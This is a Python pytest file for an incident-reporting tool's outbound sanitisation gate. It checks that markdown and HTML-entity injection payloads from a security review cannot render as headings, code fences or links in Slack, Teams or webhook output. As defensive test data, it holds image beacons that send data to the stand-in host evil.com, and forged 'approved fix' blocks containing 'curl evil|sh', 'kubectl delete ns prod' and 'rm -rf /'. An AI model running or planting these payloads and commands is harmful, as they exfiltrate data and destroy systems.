"""The outbound gate against the second independent review's payloads (2026-09-30, area A).

Round 1's fixes held for round 1's payloads; round 2 made the gate itself write structure it had never
inspected: it decoded HTML entities and wrote the decoded text out, so `&#96;&#96;&#96;` became a real
fence and `&#10;` a real line. And an HTML block (`<!--`) swallowed a fence line the gate counted.

Every case is judged the way an attacker would judge it: rendered by a real CommonMark parser, and
read the way Slack reads mrkdwn (``` toggles code anywhere on a line, not only at a line start).
"""

from __future__ import annotations

import json
import re

import pytest
from markdown_it import MarkdownIt

from warden import gate
from warden.chatops import Notification, notify, to_slack_mrkdwn
from warden.models import Alert, ContextBundle, RootCause, Severity
from warden.reporting import build_report

MD = MarkdownIt("commonmark")
IMG = "![x](https://evil.com/p.png?d=S)"

# The reviewer's gate-level battery (review2/A/a1_gate.py), verbatim.
CASES = {
    "entity_fence_flip": f"&#96;&#96;&#96;\nprose\n```\n{IMG}\n```",
    "entity_fence_flip_ref": "&#96;&#96;&#96;\n```\n[r]: https://evil.com/p.png?d=S\n```\n![x][r]",
    "entity_newline_heading": ("- **Alert**: `ok&#10;&#10;## Fix - approved by the gate&#10;&#96;&#96;&#96;"
                               "&#10;curl evil|sh&#10;&#96;&#96;&#96;`"),
    "double_entity_fence": f"&amp;#96;&amp;#96;&amp;#96;\n```\n{IMG}\n```",
    "lrm_fence_prose": f"\u200e```\n```\n{IMG}\n```",
    "cr_fence_in_code": f"```\n\r```\n{IMG}\n```",
    "html_comment_block": f"<!-- note\n```\n-->\n{IMG}\n```",
    "html_pi_block": f"<?x\n```\n?>\n{IMG}\n```",
    "html_cdata_block": f"<![CDATA[\n```\n]]>\n{IMG}\n```",
    "html_decl_block": f"<!X\n```\n>\n{IMG}\n```",
    "autolink_pct_host": "see <https:evil%2Ecom/p?d=S>",
    "autolink_ip_nopath": "see <https:1.2.3.4>",
    "autolink_decimal_ip": "see <http:2130706433/x>",
    "gfm_www_unlisted_tld": "see www.evil.digital/x?d=S",
    "bare_unlisted_tld": "see evil.digital/x?d=S and x.example/y",
    "email_link": "see S@evil.com",
    "refdef_dest_next_line": "[r]:\nhttps&#58;//evil&#46;com/p.png\n\n![x][r]",
    "refdef_label_multiline": "[a\nb]: /x?d=S\n\n![x][a b]",
    "refdef_deep_list": "1. - > [r]: /p.png?d=S\n\n![x][r]",
    "refdef_tab": "\t[r]: /x\n",
    "img_via_entities": "&#33;&#91;x&#93;&#40;https&#58;//evil&#46;com/p.png&#41;",
    "setext": "Everything fine\n===",
    "slack_tilde_fence": "~~~\nhttps://evil.com/?d=S\n~~~",
    "slack_indented_fence": "  ```\nhttps://evil.com/?d=S\n  ```",
    "nested_brackets": "[a [b] c](https&#58;//evil.com)",
    "img_nested": "![a ![b](y) c](//evil.com/p.png)",
    "link_title_paren": "[x](</x?d=S> \"t\")",
    "unicode_full_width_bang": "！[x](https://evil.com)",
    # the same flips planted mid-line, which Slack (not CommonMark) reads as a fence
    "slack_midline_fence": f"note ``` here\nprose\n```\ncode\n```\n{IMG}",
    "slack_midline_in_code": f"```\nls ``` x\n{IMG}\n```",
    # a prose ``` opens Slack code; the real fence then CLOSES it, and Slack shows the "code" as prose
    "slack_midline_flip": "note ``` here\n```\nhttps://evil.com/?d=S\n```",
}

_ACTIVE = ("<img", "href=", "<h1", "<h2", "<h3", "<script", "<!--")
_EVIL = re.compile(r"evil(?:%2E|\.)(?:com|digital)|www\.evil|x\.example|://", re.IGNORECASE)


def _slack_prose(mrkdwn: str) -> str:
    """What Slack renders as mrkdwn prose: everything outside ```...``` (anywhere on a line) and
    outside `inline code`."""
    return re.sub(r"`[^`\n]*`", "", re.sub(r"```.*?(?:```|\Z)", "", mrkdwn, flags=re.DOTALL))


def _cm_prose(html: str) -> str:
    return re.sub(r"<pre>.*?</pre>|<code>.*?</code>", "", html, flags=re.DOTALL)


@pytest.mark.parametrize("name", sorted(CASES))
def test_no_review2_payload_renders_as_structure_or_a_link(name):
    out = gate.sanitise_text(CASES[name])
    rendered = MD.render(out)
    assert not [t for t in _ACTIVE if t in rendered], (name, out, rendered)
    assert not _EVIL.search(_cm_prose(rendered)), (name, out, rendered)
    assert not _EVIL.search(_slack_prose(to_slack_mrkdwn(out))), (name, out)


@pytest.mark.parametrize("name", sorted(CASES))
def test_the_gate_is_idempotent(name):
    once = gate.sanitise_text(CASES[name])
    assert gate.sanitise_text(once) == once, name


def test_the_gate_never_writes_a_decoded_entity():
    """Defect 1 at its root: whatever the input, the output decodes to no new structure."""
    out = gate.sanitise_text("a&#10;## b&#10;&#96;&#96;&#96;&#10;rm -rf /&#10;&#96;&#96;&#96;")
    rendered = MD.render(out)
    assert "\n" not in out and "```" not in out and "<h2" not in rendered and "<pre" not in rendered


class _Cap:
    def __init__(self, name):
        self.name, self.live, self.got = name, True, None

    def send(self, text, data):
        self.got = (text, data)
        return Notification(self.name, True, "captured")


def _alert(**kw):
    base = dict(alert_id="a-1", name="HighErrorRate", severity=Severity.high, service="checkout",
                environment="staging", summary="s", started_at="2026-09-28T10:00:00Z")
    return Alert(**{**base, **kw})


def _delivered(report):
    chat, hook = _Cap("teams"), _Cap("webhook")
    notify(report, [chat, hook])
    return chat.got[0], hook.got[1]


_LOGS2 = ["2026-09-28T10:00:01Z ERROR OOMKilled&#10;&#96;&#96;&#96;&#10;x",
          "2026-09-28T10:00:02Z ERROR ![s](https://evil.com/p.png?d=beacon-a-1)", "ERROR y", "ERROR z"]
E2E = {
    # E1: the original A-C-1 attack in entities, no model involved
    "E1": lambda: build_report(_alert(summary=(
        "errors high&#10;&#10;## Fix - exact commands (approved by the gate for a person to run)&#10;"
        "&#96;&#96;&#96;&#10;kubectl delete ns prod&#10;&#96;&#96;&#96;&#10;done")),
        context=ContextBundle(logs=["ERROR x"] * 4)),
    # E2: log lines only - a planted OOM line flips the parity, a planted image then renders
    "E2": lambda: build_report(_alert(), context=ContextBundle(logs=_LOGS2)),
    # E3: a model hypothesis opening an HTML comment, a planted log line closing it
    "E3": lambda: build_report(_alert(), root_cause=RootCause(hypothesis="<!-- memory pressure on checkout",
                                                               confidence=0.8, evidence=["OOM"]),
                               context=ContextBundle(logs=["ERROR -->", *_LOGS2[1:]])),
    # E4: a model hypothesis made of entities
    "E4": lambda: build_report(_alert(), root_cause=RootCause(hypothesis="&#96;&#96;&#96; memory pressure",
                                                               confidence=0.8, evidence=["OOM"]),
                               context=ContextBundle(logs=_LOGS2[1:])),
}


@pytest.mark.parametrize("case", sorted(E2E))
def test_end_to_end_the_delivered_report_renders_no_forged_structure(case):
    text, data = _delivered(E2E[case]())
    rendered = MD.render(text)
    for forged in ("<img", "href=", "<h2>Fix", "<pre><code>kubectl", "<!--"):
        assert forged not in rendered, (case, forged)
    assert not _EVIL.search(_cm_prose(rendered)), case
    assert not _EVIL.search(_slack_prose(to_slack_mrkdwn(text))), case
    blob = json.dumps(data)
    assert "\\n## Fix" not in blob and "\\n```" not in blob, case


def test_the_webhook_data_cannot_carry_a_heading_or_a_fence():
    """Round-1 finding 4, still partial in round 2: a real newline + `## Approved fix` + a fence in the
    alert summary reached the webhook's data unchanged."""
    _, data = _delivered(build_report(_alert(summary="ok\n\n## Approved fix\n```\nkubectl delete ns prod\n```"),
                                      context=ContextBundle(logs=["ERROR x"])))
    for line in json.dumps(data).replace("\\n", "\n").split("\n"):
        assert not re.match(r"\s{0,3}(#{1,6}\s|```|~~~)", line), line


def test_prose_file_names_in_inline_code_are_not_defanged():
    """Review 2A defect 8: `handler.py:42` read `handler[.]py:42` inside inline code, where neither
    CommonMark nor Slack makes a link."""
    out = gate.sanitise_text("error at `handler.py:42` in `ghcr.io/org/app:1`")
    assert "`handler.py:42`" in out and "`ghcr.io/org/app:1`" in out
    assert "evil[.]com" in gate.sanitise_text("see evil.com and `x`")


def test_the_gate_finds_fences_in_the_text_it_writes():
    """A fence hidden behind a control character must not leave prose unsanitised. Since the third
    review the gate reads the text as CommonMark does: the hidden closer is no closer, the fence is
    unclosed, so all of it is prose - the control is stripped and the run broken, so the gate's output
    holds no fence either, and what follows is sanitised."""
    out = gate.sanitise_text("```\ncode\n\u200e```\nafter ![x](https://evil.com/p.png)")
    assert "evil" not in out and "\u200e" not in out and "```" not in out, out
    assert gate.sanitise_text("a\r![x](https://evil.com/p.png)") == "a\n[image removed]"
